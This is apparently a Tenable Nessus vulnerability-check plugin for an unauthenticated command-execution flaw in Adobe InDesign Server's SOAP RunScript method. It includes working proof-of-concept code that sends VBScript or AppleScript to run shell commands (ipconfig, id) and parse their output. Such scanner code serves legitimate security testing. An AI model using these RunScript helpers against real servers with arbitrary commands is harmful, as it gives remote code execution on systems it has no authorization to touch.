#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(65127);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/09/24 20:59:27 $");

  script_bugtraq_id(56574);
  script_osvdb_id(87548);
  script_xref(name:"EDB-ID", value:"23178");
  script_xref(name:"Secunia", value:"48572");

  script_name(english:"Adobe InDesign Server RunScript Arbitrary Command Execution");
  script_summary(english:"Tries to execute a command");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A web service running on the remote host has a command execution
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of Adobe InDesign Server running on the remote host has an
arbitrary command execution vulnerability.  When the SOAP service is
enabled, it processes requests for the RunScript method without
requiring authentication.  This method can be used to execute arbitrary
VBScript on Windows, or AppleScript on Mac OS.  A remote,
unauthenticated attacker could exploit this to execute arbitrary code."
  );
  script_set_attribute(attribute:"solution", value:"There is no known solution at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Adobe IndesignServer 5.5 SOAP Server Arbitrary Script Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/11/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/03/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:adobe:indesign");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("wsdl.nasl", "os_fingerprint.nasl");
  script_require_ports("wsdl/adobe_indesign");
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

global_var port;
port = get_kb_item_or_exit('wsdl/adobe_indesign');

##
# Sends a RunScript request to the InDesign SOAP Server
#
# @anonparam language the language of the script contained in the RunScript request
# @anonparam script the source code of the script to execute
# @return the resulting RunScriptResponse (an XML string)
##
function _run_script()
{
  local_var language, code, req, res;
  language = _FCT_ANON_ARGS[0];
  code = _FCT_ANON_ARGS[1];

  req =
'<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope
xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:IDSP="http://ns.adobe.com/InDesign/soap/">
  <SOAP-ENV:Body>
    <IDSP:RunScript>
      <IDSP:runScriptParameters>
        <IDSP:scriptLanguage>' + language + '</IDSP:scriptLanguage>
        <IDSP:scriptText>' + code + '</IDSP:scriptText>
      </IDSP:runScriptParameters>
    </IDSP:RunScript>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>';

  res = http_send_recv3(
    method:'POST',
    item:'/',
    content_type:'text/xml',
    port:port,
    data:req,
    exit_on_fail:TRUE
  );

  return res[2];
}

##
# Attempts to execute a shell command on a Mac host using AppleScript via a RunScript request
#
# @remark the output that the server sends in its response is the value of the last variable in the script
# @anonparam cmd command to execute
# @return a RunScriptResponse
##
function _run_mac_cmd()
{
  local_var cmd, code;
  cmd = _FCT_ANON_ARGS[0];

  code = 'do shell script "/bin/sh -c ' + cmd + '"';

  return _run_script('applescript', code);
}

##
# Attempts to execute a shell command on a Windows host using VBScript via a RunScript request
#
# @remark the output that the server sends in the response is whatever is
#         assigned to the "returnValue" variable in the script
# @anonparam cmd command to execute. this command is passed directly to "cmd /c"
# @return a RunScriptResponse
##
function _run_windows_cmd()
{
  local_var cmd, code;
  cmd = _FCT_ANON_ARGS[0];

  code =
'set shell = CreateObject("WScript.Shell")
set process = shell.Exec("cmd /c ' + cmd + '")
do while not process.StdOut.AtEndOfStream
    output = output &amp; process.StdOut.ReadLine() &amp; vbLf
loop
returnValue = output';

  return _run_script('visual basic', code);
}

##
# Tries to parse command output from a RunScriptResponse
#
# @anonparam xml SOAP response containing the RunScriptResponse to parse
# @return command output if any was found in 'xml',
#         NULL otherwise
##
function _parse_output()
{
  local_var xml, start_tag, end_tag, output;
  xml = _FCT_ANON_ARGS[0];

  start_tag = stridx(xml, '<scriptResult><data xsi:type="xsd:string">');
  if (start_tag == -1) return NULL;

  end_tag = stridx(xml, '</data>', start_tag + 1);
  if (end_tag == -1) return NULL;

  output = substr(xml, start_tag, end_tag - 1);
  output -= '<scriptResult><data xsi:type="xsd:string">';
  output = str_replace(string:output, find:'&#xA;', replace:'\n');
  return output;
}

##
# Reports the vulnerability and exits
#
# @anonparam cmd shell command that was executed
# @anonparam output command output from running "cmd"
# @remark this function exits before returning
##
function _report_and_exit()
{
  local_var cmd, request, output, report;
  cmd = _FCT_ANON_ARGS[0];
  output = _FCT_ANON_ARGS[1];

  if (report_verbosity > 0)
  {
    report =
      '\nNessus executed "' + cmd + '" by sending the following request :\n\n' +
      crap(data:'-', length:30) + " request " + crap(data:'-', length:30) + '\n' +
      chomp(http_last_sent_request()) + '\n' +
      crap(data:'-', length:30) + " request " + crap(data:'-', length:30) + '\n' +
      '\nWhich resulted in the following command output :\n\n' +
      output;
    security_hole(port:port, extra:report);
  }
  else security_hole(port);

  exit(0);
}

# the software only runs on Windows or Mac. We can use the OS fingerprinting
# results as a best guess for which payload to attempt first, but if ends up
# being inaccurate, both payloads will be attempted
os = get_kb_item('Host/OS');
if (isnull(os) || 'Windows' >< os)
  do_windows_poc = TRUE;
else
  do_windows_poc = FALSE;

for (i = 0; i < 2; i++)
{
  if (do_windows_poc)
  {
    cmd = 'ipconfig';
    xml = _run_windows_cmd(cmd);
    output = _parse_output(xml);
    if ('Windows IP Configuration' >< output)
      _report_and_exit(cmd, output);
  }
  else
  {
    cmd = '/usr/bin/id';
    xml = _run_mac_cmd(cmd);
    output = _parse_output(xml);
    if ('uid=' >< output)
      _report_and_exit(cmd, output);
  }

  # 'visual basic' is only valid on Windows, and 'applescript' is only valid
  # on Mac. If the server responds to say the language specified in the request
  # is invalid, that means the plugin used the wrong PoC, and it will try again
  # (at most, two PoCs will be attempted).  if the server doesn't say the language
  # specified was invalid, that means something unexpected happened, which means
  # the bug is probably not exploitable against the target
  if ('Invalid scripting language' >< xml)
    do_windows_poc = do_windows_poc ^ TRUE;
  else
    audit(AUDIT_LISTEN_NOT_VULN, 'InDesign Server SOAP service', port);
}

# i don't think this code is reachable, but it's here just in case
audit(AUDIT_LISTEN_NOT_VULN, 'InDesign Server SOAP service', port);
